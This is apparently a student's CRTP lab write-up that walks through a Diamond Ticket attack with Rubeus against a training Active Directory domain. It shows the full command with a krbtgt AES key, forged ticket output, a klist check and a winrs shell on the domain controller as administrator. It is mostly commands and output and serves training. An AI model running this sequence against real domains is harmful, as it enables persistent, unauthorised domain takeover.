# CRTP: Hands-On 10

```
• Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.
```


## Diamon ticket with DA privileges

From elevated promt:
```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createonly:C:\Windows\System32\cmd.exe /show /ptt
```
krbkey: aes256 krbtgt

Impersonate administrator:
```

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dcorp-dc.dollarcorp.moneycorp.local'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: Vy02TVv8Of3GOD5uzDAYdzdze9Jlo4F0F6YqKl1VAV0=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIGAjCCBf6gAwIBBaEDAgEWooIE2TCCBNVhggTRMIIEzaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOC
      BHUwggRxoAMCARKhAwIBAqKCBGMEggRfXtfV/92qvcC3WcCzXPQSc4hsjVi7R3BG7iOQcRG5Kslds0LZ
      F9YLTUQ2xWy8xdmDlYvc60WSdGNkSNhxAEBRKfTrE1ZMsKGb2787zbcI7ybl2BfDk08t2XniOHAn+5IN
      12E8ZDuJByIR4ECEcpVOYpoh6kotJr6tOmJ3OW+GAqiGqTQ7AldjZMQLCYbbaglGHEfi6BjgldamRIRZ
      Di4xSPhOnYv2NpsxivIL7jrYWdbfz8/lOcTz7bGMGNrPoVqKq1E7uqLbYP6RdPX9AIL6ICAciQwuml9x
      8KZEjN5vItBvZhTHC0fpW4u/DPqrjdsl83AoByr6LUYaDx+IDabqGo4nNKlCmkDdV+toRkDx7hdSEtyF
      4Cr+qmuzOf/bSUpMDjp2Vw5O0/pNe6j1yP3+dJJ2RDYI+3uw5Femz6cEvMqGC++1eITqUnkO4Fsp7rVA
      orvnb3q8iBHq8QP41LR4rEE9OXdABeeM0X9q0IEILn14P8GV9QkY+P7Jdo4e6oXHmx+iDzZmrUCVVLIe
      x6zMaMTvgJwu7KzhX6GNnGHF1ZfvZwc41NsfXgTZu2FxGqC9EcAfTeq+fIxxA8fH8fUaI5abOoGDklrD
      cFtTcnq5t9TIp3aVI2V7NJi8MnKYKkp5O1g1eVAlmUYOG67vLokkwsLls2hc9DuRIE2LD1FGmonOet4V
      gH6Pn8mrWsCQ1RDHrpy6R9bc2/seM/tTmiriawzVMKY/c0hLh79sGDGBt2tW6DnlflOXyLmeY3uV8tVB
      2+axgso/uoApLMadi8k2E+dICnhFH7eQ1paC30kqRxjXZld2KqXBOxTySc9K1JoABY7SevC+6ojMNtKH
      Vec5MHnS2/f6XV13f1z9a+mL7Q2roqCsFN34x3Lrd7i4cPdmY4U3c4+odbnHzRkNSVP9T/HLkeeR9k7u
      kYi+ZHh7eNiEBKJCHSHXnEKhaGXOcHJlBnIaEB2fyM7h0hpBwbAhsaHc6UVrPFuilcy71dyTKYECcjJU
      2WUvzAENi1Nupwb1jAyR86YK4/W6ztAiVuCr/LApBkrVYKvsLE4BYm8f9M7K39IF5qhTBJZOZ46Uk5vX
      oFO+T0o9LIUdWARVEqPIFO0jWptuF2rtvcZYMJOfmSxe4Jkrv9mm4yaNdQOGe1kKlPUJXSxMPaKIw1Mw
      kS/upkYQn5ksKNc5C4ZpPBVjeGVNpQa26AXT/Td9I85lx24nnc5hCXLd5aQz0exD7iO5qvL/aMCq0DdZ
      Y2CDU4pBnnumrMQ7IZ4Sr9EgnPj1Ep6zC3Ur+vxMcO1b5bzTlYSq8GyHKNqAQ4ZT6EbqWVrffg49rCkV
      /AHgSLK2d/YcGCom13cpo/oDQ7FLu7/iMFrpjJAfBS92/VRFMR3D9dTGvWoT9OU+zHO3G2iFA0IT1LkV
      B6iAQrE7HkaHnQ2hAOE/JYjznHJKoXWcVoM4DNa12iTFkiMLGwQC4eLiQ7QDb9yMQqHF5uC5EcUQrHPR
      vcWNo4IBEzCCAQ+gAwIBAKKCAQYEggECfYH/MIH8oIH5MIH2MIHzoCswKaADAgESoSIEIBZbFjpIhFtB
      3hP/wM5OdERnM/LhFAEKfzPU1jBHCV5MoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohUwE6AD
      AgEBoQwwChsIc3ZjYWRtaW6jBwMFAGChAAClERgPMjAyMzA1MDExNTU3MTVaphEYDzIwMjMwNTAyMDE1
      NzE0WqcRGA8yMDIzMDUwODE1NTcxNFqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMC
      AQKhJjAkGwZrcmJ0Z3QbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FM

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIGZjCCBmKgAwIBBaEDAgEWooIFNjCCBTJhggUuMIIFKqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOC
      BNIwggTOoAMCARKhAwIBA6KCBMAEggS8PnS021XQUSWtgZrD8aACDT2XS3wsDo/Ummj2l7+ZMyDGI70x
      A2++Q1pqRC1/D0GvnIkMJ6IOg9V57VGvxuH5nXU/4cXOZVsJa4o1B9q34UO+GyCOjBYlPm1dXBkgWUVF
      BLv/RJeJjUy/qFpJAs55iVdAqPyAJ8h+EnbnwNnwRy6bhMz3MLC4VAwmSn7BrBGoJ++/W5pdKinFpPJo
      BEtELBQDb5jSUyWR32QzYnKyQICwOSkfyETfBilv8tungJwxudzPj7D3+tw1YnpRun7exEE+GGvMkKpO
      zbIU9obSAXVfsb00GCUqEHmLUEySWrahHrfxA2ATfpvHjTPO+qoVXtpRZqrs91xrLUSCyLJD4EIPTdVG
      JdrBoIaZD+kjlCnuot+ch6UG9bd18bDAkNOeq9QEqZOI9+JlNCv1kY8OXlGPcMPkbzcR6mI/y/iakCfP
      ThEMEU1rXkCIEKBpE3YGlv8r8hpUzICwBRiz+GM1j7YgPsqIohGWbS5jpdyl2QhR+cdTNw+scDS+JYIs
      Nl1Ax+kjWK6+cHrJYXa9uTJiKRFLzESJrphdb85xUNdQw9fLL9t9lEZ2B1rS1kYPfxMWLSsPyCHVQOjv
      fRzYfCeMykf2/OXo/5BYiNG2i5BiZPQ2p0YvnE1pLG9R/aMdHUHmjBHTw0E6W4yJNlglsxm5B9VIvzea
      gqcAQY1wr+CjKVJrpnqezal4In+EWUGgYUxeJGJgz9mAPeZKlH2bzO1vBofQsGX4XNmxmVWJ1MZ0B2BR
      LvGSGti8K8PlY8XE3CORTBC8+CycphH+C8gVk/xRuh4fy/t9mCo8pC+RMHsai0KUSJ3ANnxgjEIJ1aMu
      EAwzB/rEioj//tI350W7EEZyAmei0Ro1MLpza9RrJgGPZNNXWflm8YmLy6sQ2pRj2LISOU0j+ey2jn71
      WTCASlLvrRjreqYzkFxSC903KSmOBBP0HlalGENwJX059lsIRyXzM8R8SpME4EOYvhjbcWUkdNexEUAC
      r1ruqoK7kjmx01Zikl+UnPYN2lC7tmZ9Afy4R6WTqzKuQAAts8qbpOYGjjPwh5DinmpKkxtTQepVXn6L
      hnoRQemSczxbo/IRs01NTwngSUlwYVm52x1I91LIb8Pyw1pQckviLsCS3Ml/zmVGi+CvZCqYcNEo0343
      nmCkQvi/7/VJisgSFEvqOoyPjHaqQu2b36/7VOskucAzzYel5TDb4tq9RM0l2XYgR9EhhX/PaCGUlZGI
      sepwKpqVvDoaWfpfDKolAtLe3jMY2bAup7h9wjaMtAterMgTWYvXEmbfSxdWKxJQzhN9H2hVxfsa5JsG
      aLbinhG6QLieI0OeNWdlzGSeQyDyvwPfHbXNB+bzqtXAxNQt4H7jgJUFJ7amseKaJ4qISD6bL/yOn6yb
      NWh8D07VATwWZM21t3kj88w3Lcl7tLfAMptJJdArTMjQRVdi6dFRTRbeZDLsqrTnfX/xR9WDpFMasH2y
      VufiQ5TiTI162MArItbq3CjqxWRu1IteGHFFOZU5/+R1KmBVLerqROkexlRhxOQVX8TVL1xjbHe1BDrP
      gyCTfNElLyZGXJkh6Fy2YZrOFVXg9iUVC44TGRnGSwNh0yWto4IBGjCCARagAwIBAKKCAQ0EggEJfYIB
      BTCCAQGggf4wgfswgfigKzApoAMCARKhIgQgFlsWOkiEW0HeE//Azk50RGcz8uEUAQp/M9TWMEcJXkyh
      HBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhdG9yowcD
      BQBgoQAApREYDzIwMjMwNTAxMTU1NzE1WqYRGA8yMDIzMDUwMjAxNTcxNFqnERgPMjAyMzA1MDgxNTU3
      MTRaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xM
      QVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==


[+] Ticket successfully imported!
```

Validate ticket:
```
C:\Windows\system32>klist

Current LogonId is 0:0x79173b0

Cached Tickets: (1)

#0>     Client: administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 5/1/2023 8:57:15 (local)
        End Time:   5/1/2023 18:57:14 (local)
        Renew Time: 5/8/2023 8:57:14 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

abuse permissions:

```
C:\Windows\system32>winrs -r:dcorp-dc cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami
whoami
dcorp\administrator

C:\Users\Administrator>hostname
hostname
dcorp-dc

C:\Users\Administrator>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::20f3:6a81:3eb4:45cb%9
   IPv4 Address. . . . . . . . . . . : 172.16.2.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.2.254

```
